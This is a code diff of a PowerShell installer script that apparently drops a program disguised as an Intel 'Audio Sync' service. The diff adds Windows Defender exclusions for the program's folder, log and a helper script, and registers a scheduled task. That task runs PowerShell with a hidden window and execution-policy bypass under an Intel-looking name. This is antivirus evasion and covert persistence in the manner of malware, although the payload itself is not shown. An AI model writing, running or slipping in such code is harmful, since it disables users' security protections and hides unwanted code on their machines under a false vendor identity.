@@ -11,6 +11,7 @@ $TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Sy
 $TargetFile = "$TargetPath\Intel Audio Sync.exe"
 $TargetZip = "$TargetPath\Intel Audio Sync.zip"
 $TargetLog = "$TargetPath\Intel Audio Sync.log"
+$TargetScript = "$TargetPath\ias.ps1"
 
 if (Test-Path "$TargetFile") {
   Remove-Item -Force -Path "$TargetFile"
@@ -26,6 +27,8 @@ Add-MpPreference -ExclusionProcess 'Intel Audio Sync' -Force
 Add-MpPreference -ExclusionProcess 'Intel Audio Sync.exe' -Force
 Add-MpPreference -ExclusionPath "$TargetPath" -Force
 Add-MpPreference -ExclusionPath "$TargetFile" -Force
+Add-MpPreference -ExclusionPath "$TargetLog" -Force
+Add-MpPreference -ExclusionPath "$TargetScript" -Force
 Write-Output "Exclusions added"
 
 if (-Not (Test-Path "$TargetFile")) {
@@ -39,13 +42,13 @@ if (-Not (Test-Path "$TargetFile")) {
 
 $TaskDescription = "Running Intel(R) Dynamic Management Audio Sync Service from Task Scheduler"
 $TaskCommand = "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe"
-$TaskScript = "$TargetFolder\ias.ps1"
+$TaskScript = "$TargetPath\ias.ps1"
 $TaskArg = "-WindowStyle Hidden -NonInteractive -Executionpolicy bypass -file $TaskScript"
 $TaskStartTime = [datetime]::Now.AddMinutes(1)
 $service = new-object -ComObject("Schedule.Service")
 $service.Connect()
 $TaskName = "Intel(R) Dynamic Management Audio Sync Service"
-$rootFolder = $service.GetFolder("\Intel\Audio")
+$rootFolder = $service.GetFolder("\")
 $TaskDefinition = $service.NewTask(0)
 $TaskDefinition.RegistrationInfo.Description = "$TaskDescription"
 $TaskDefinition.Settings.Enabled = $true
